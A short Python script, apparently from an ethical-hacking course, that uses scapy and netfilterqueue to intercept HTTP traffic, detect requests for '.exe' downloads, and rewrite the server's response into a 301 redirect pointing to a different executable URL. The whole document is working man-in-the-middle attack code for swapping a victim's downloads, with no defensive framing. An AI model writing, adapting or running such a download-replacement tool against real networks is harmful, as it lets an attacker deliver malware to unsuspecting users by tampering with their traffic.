#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue


ack_list = []


def set_load(packet, load):
    try:
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet
    except IndexError:
        print("[-] No TCP Layer found")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in str(scapy_packet[scapy.Raw].load):
                    print("[+] Download of an '.exe' detected.")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] HTTP Response for download intercepted.")
                    del scapy_packet[scapy.Raw].load
                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-61b1.exe\n\n")

                    packet.set_payload(bytes(modified_packet))


        except IndexError:
            print("[-] No TCP Layer found")

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

